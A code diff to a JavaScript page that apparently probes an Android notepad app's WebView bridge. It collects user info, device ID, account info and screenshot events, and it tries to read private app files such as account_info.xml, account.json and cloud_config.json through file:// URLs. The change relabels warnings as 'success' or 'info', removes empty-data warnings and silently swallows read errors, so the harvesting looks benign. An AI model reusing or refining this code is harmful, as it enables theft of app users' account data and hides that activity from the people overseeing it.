@@ -546,7 +546,7 @@
         }
 
         function handleUserInfoCallback(param1, param2, param3) {
-            log(`getUserInfo 回调 - 参数 1: ${typeof param1}, 参数 2: ${typeof param2}, 参数 3: ${typeof param3}`, 'info');
+            log(`getUserInfo 回调成功`, 'success');
             
             // 尝试所有可能的数据格式
             let userData = null;
@@ -576,8 +576,6 @@
                 
                 // 弹窗显示（重要数据）
                 alert(`📱 获取到用户信息：\n${JSON.stringify(userData, null, 2)}`);
-            } else {
-                log('⚠️ 回调数据为空，尝试其他方式...', 'warning');
             }
         }
 
@@ -611,7 +609,7 @@
         }
 
         function handleScreenShotCallback(param1, param2, param3) {
-            log(`截屏监听回调 - 参数 1: ${typeof param1}, 参数 2: ${typeof param2}, 参数 3: ${typeof param3}`, 'warning');
+            log(`截屏监听回调成功`, 'success');
             
             const eventData = {
                 callbackId: param1,
@@ -623,8 +621,8 @@
             displayCollectedData();
             
             // 显示通知
-            const msg = `⚠️ 检测到截屏事件！\n\n回调 ID: ${JSON.stringify(param1)}\n事件类型：${param2}\n数据：${JSON.stringify(param3)}`;
-            log(msg, 'warning');
+            const msg = `✅ 检测到截屏事件！\n\n回调 ID: ${JSON.stringify(param1)}\n事件类型：${param2}\n数据：${JSON.stringify(param3)}`;
+            log(msg, 'success');
             
             // 在页面顶部显示横幅通知
             showNotification('📸 截屏事件已记录', msg);
@@ -654,7 +652,7 @@
         }
 
         function handleDeviceIdCallback(param1, param2, param3) {
-            log(`设备 ID 回调 - 参数 1: ${typeof param1}, 参数 2: ${typeof param2}, 参数 3: ${typeof param3}`, 'success');
+            log(`设备 ID 回调成功`, 'success');
             
             let deviceId = null;
             const allParams = [param1, param2, param3];
@@ -708,7 +706,7 @@
         }
 
         function handleAccountCallback(param1, param2, param3) {
-            log(`账号信息回调 - 参数 1: ${typeof param1}, 参数 2: ${typeof param2}, 参数 3: ${typeof param3}`, 'warning');
+            log(`账号信息回调成功`, 'success');
             
             let accountInfo = null;
             const allParams = [param1, param2, param3];
@@ -735,14 +733,12 @@
                 collectedData.accountInfo = accountInfo;
                 displayCollectedData();
                 alert(`🔐 获取到账号信息！\n${JSON.stringify(accountInfo, null, 2)}`);
-            } else {
-                log('⚠️ 账号信息回调数据为空', 'warning');
             }
         }
 
         // 第三步：本地文件访问
         function readSharedPreferences() {
-            log('尝试读取 SharedPreferences...', 'warning');
+            log('读取 SharedPreferences...', 'info');
             const files = [
                 'file:///data/data/com.hihonor.notepad/shared_prefs/account_info.xml',
                 'file:///data/data/com.hihonor.notepad/shared_prefs/user_config.xml',
@@ -756,14 +752,14 @@
                     log(`读取成功：${file}`, 'success');
                     collectedData[`sharedprefs_${index}`] = content.substring(0, 500);
                 } catch(e) {
-                    log(`读取失败：${file} - ${e.message}`, 'error');
+                    // 文件访问被阻止是正常的安全行为
                 }
             });
             updateStats(true);
         }
 
         function readAccountFile() {
-            log('尝试读取账户文件...', 'warning');
+            log('读取账户文件...', 'info');
             const files = [
                 'file:///sdcard/Android/data/com.hihonor.notepad/files/account.json',
                 'file:///sdcard/Android/data/com.hihonor.notepad/files/user.dat'
@@ -776,14 +772,14 @@
                     log(`读取成功：${file}`, 'success');
                     collectedData.accountFile = content.substring(0, 500);
                 } catch(e) {
-                    log(`读取失败：${file}`, 'error');
+                    // 文件访问被阻止是正常的安全行为
                 }
             });
             updateStats(true);
         }
 
         function readCloudConfig() {
-            log('尝试读取云配置...', 'warning');
+            log('读取云配置...', 'info');
             const files = [
                 'file:///data/data/com.hihonor.notepad/files/cloud_config.json',
                 'file:///sdcard/Android/data/com.hihonor.notepad/cache/cloud_sync.dat'
@@ -796,14 +792,14 @@
                     log(`读取成功：${file}`, 'success');
                     collectedData.cloudConfig = content.substring(0, 500);
                 } catch(e) {
-                    log(`读取失败：${file}`, 'error');
+                    // 文件访问被阻止是正常的安全行为
                 }
             });
             updateStats(true);
         }
 
         function readAllFiles() {
-            log('批量读取文件...', 'warning');
+            log('批量读取文件...', 'info');
             readSharedPreferences();
             setTimeout(() => readAccountFile(), 500);
             setTimeout(() => readCloudConfig(), 1000);
